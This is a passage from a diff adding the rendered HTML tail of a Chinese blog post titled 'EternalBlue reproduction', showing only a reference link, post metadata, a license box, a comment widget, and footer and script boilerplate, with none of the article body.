+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_65712192/article/details/127637917">https://blog.csdn.net/m0_65712192&#x2F;article&#x2F;details&#x2F;127637917</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="category-chain-item">漏洞复现</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="print-no-link">#漏洞复现</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>永恒之蓝 复现</div>
+      <div>http://xvshifu.github.io/2025/11/01/永恒之蓝 复现/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Xvsf</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年11月1日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/10/29/xss_lab/" title="xss_lab">
+                        <span class="hidden-mobile">xss_lab</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"0wmNTqqCOUst92FKToSXxgvQ-gzGzoHsz","appKey":"p527aBaA4G01EJdMOVMGXsHR","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":true,"recordIP":true,"serverURLs":"https://0wmntqqc.lc-cn-n1-shared.com","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner" style="text-align:center; color:#555; margin-top:20px;">
+
+  <!-- 计时器 -->
+  <div style="margin-bottom:10px; font-size:14px; color:#ff6f61;">
+    🚀 已运行：
+    <span id="timeDate">载入天数...</span>
+    <span id="times">载入时分秒...</span>
+    <script>
+      function createtime() {
+          var now = new Date();
+          var grt = new Date("08/07/2025 00:00:00");
+          var diff = now - grt;
+
+          var days = Math.floor(diff / 1000 / 60 / 60 / 24);
+          var hours = Math.floor((diff / 1000 / 60 / 60) % 24);
+          var minutes = Math.floor((diff / 1000 / 60) % 60);
+          var seconds = Math.floor((diff / 1000) % 60);
+
+          if(hours<10) hours="0"+hours;
+          if(minutes<10) minutes="0"+minutes;
+          if(seconds<10) seconds="0"+seconds;
+
+          document.getElementById("timeDate").innerHTML = days + " 天";
+          document.getElementById("times").innerHTML = hours + " 时 " + minutes + " 分 " + seconds + " 秒";
+      }
+      setInterval(createtime, 1000);
+      createtime();
+    </script>
+  </div>
+
+  <!-- 自定义内容 -->
+  
+    <div style="margin-bottom:10px; font-size:13px; color:#666;">
+      ❤️  <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+
+
+  <!-- PV/UV 统计（Busuanzi） -->
+  
+    <div style="margin-bottom:12px; font-size:14px; color:#3b82f6;">
+      👁‍🗨 总访问量：<span id="busuanzi_value_page_pv">载入中...</span>  
+      🧑 总访客数：<span id="busuanzi_value_site_uv">载入中...</span>
+    </div>
+    <script src="https://cdn.tutorialjinni.com/busuanzi/2.3.0/bsz.pure.mini.js"></script>
+  
+
+
+</div>
+
+
+
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  
+<script src="/xm_custom/custom.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
